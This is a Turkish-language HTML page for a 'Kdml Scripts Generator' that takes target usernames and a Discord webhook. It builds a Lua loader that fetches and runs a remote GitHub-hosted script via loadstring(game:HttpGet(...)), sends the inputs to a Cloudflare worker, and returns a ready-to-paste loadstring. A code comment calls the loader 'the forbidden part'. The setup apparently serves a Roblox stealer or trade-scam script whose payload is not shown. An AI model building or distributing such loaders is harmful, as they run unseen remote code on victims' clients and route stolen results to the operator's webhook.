<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kdml Scripts Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            background: radial-gradient(circle at center, #1a0b2e 0%, #050505 100%);
            font-family: 'Inter', sans-serif;
            color: white;
            min-height: 100vh;
        }
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }
        .neon-text {
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 10px #a855f7, 0 0 20px #a855f7;
        }
        .neon-border:focus {
            border-color: #a855f7;
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
            outline: none;
        }
        .btn-glow:hover {
            box-shadow: 0 0 25px rgba(168, 85, 247, 0.6);
            transform: translateY(-2px);
        }
    </style>
</head>
<body class="flex items-center justify-center p-4">

    <div class="glass w-full max-w-md p-8 rounded-2xl">
        <h1 class="neon-text text-2xl text-center mb-8 font-bold tracking-widest text-purple-500 uppercase">Kdml Scripts</h1>
        
        <div class="space-y-6">
            <div>
                <label class="block text-xs font-semibold text-purple-300 uppercase tracking-wider mb-2">Usernames</label>
                <input type="text" id="usernames" placeholder="user1,user2,user3" 
                    class="w-full bg-black/50 border border-white/10 rounded-lg p-3 text-sm neon-border transition-all">
                <p id="userError" class="hidden text-red-400 text-xs mt-2 italic">Yanlış kullanım! Virgül sonrası boşluk bırakma.</p>
            </div>

            <div>
                <label class="block text-xs font-semibold text-purple-300 uppercase tracking-wider mb-2">Your Webhook</label>
                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." 
                    class="w-full bg-black/50 border border-white/10 rounded-lg p-3 text-sm neon-border transition-all">
            </div>

            <button onclick="generateScript()" id="genBtn" 
                class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-3 rounded-lg btn-glow transition-all uppercase tracking-widest text-sm">
                Generate Script
            </button>

            <div id="resultArea" class="hidden space-y-4 pt-4 border-t border-white/10">
                <div class="relative">
                    <label class="block text-xs font-semibold text-gray-400 mb-2 uppercase">Result (PC & Mobile):</label>
                    <textarea id="output" readonly 
                        class="w-full bg-black/80 border border-purple-500/30 rounded-lg p-3 text-xs text-purple-200 h-24 font-mono"></textarea>
                    <button onclick="copyToClipboard()" 
                        class="mt-2 w-full bg-white/5 hover:bg-white/10 text-xs py-2 rounded border border-white/10 transition-all">
                        Copy to Clipboard
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function generateScript() {
            const users = document.getElementById('usernames').value;
            const webhook = document.getElementById('webhook').value;
            const userError = document.getElementById('userError');
            const genBtn = document.getElementById('genBtn');
            const resultArea = document.getElementById('resultArea');
            const output = document.getElementById('output');

            // Kontrol: Boşluk var mı?
            if (users.includes(', ')) {
                userError.classList.remove('hidden');
                return;
            } else {
                userError.classList.add('hidden');
            }

            if (!users || !webhook) {
                alert("Lütfen tüm alanları doldur!");
                return;
            }

            genBtn.innerText = "Generating...";
            genBtn.disabled = true;

            // Lua Kodunu Oluştur (İşte o yasaklı kısım!)
            const luaCode = `_G.Usernames = "${users}"\n_G.Wwbhook = "${webhook}"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/kedd063/KdmlScripts/refs/heads/main/etfb.lua"))()`;

            try {
                const response = await fetch("https://is.kdml.workers.dev/", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: users,
                        receiver_webhook: webhook,
                        code: luaCode
                    })
                });

                const data = await response.json();

                if (data.loadstring) {
                    resultArea.classList.remove('hidden');
                    output.value = data.loadstring;
                } else if (data.error) {
                    alert("Hata: " + data.error);
                }
            } catch (err) {
                alert("Worker'a bağlanılamadı! İnternetini veya Worker URL'sini kontrol et.");
            } finally {
                genBtn.innerText = "Generate Script";
                genBtn.disabled = false;
            }
        }

        function copyToClipboard() {
            const output = document.getElementById('output');
            output.select();
            document.execCommand('copy');
            alert("Kopyalandı!");
        }
    </script>
</body>
</html>
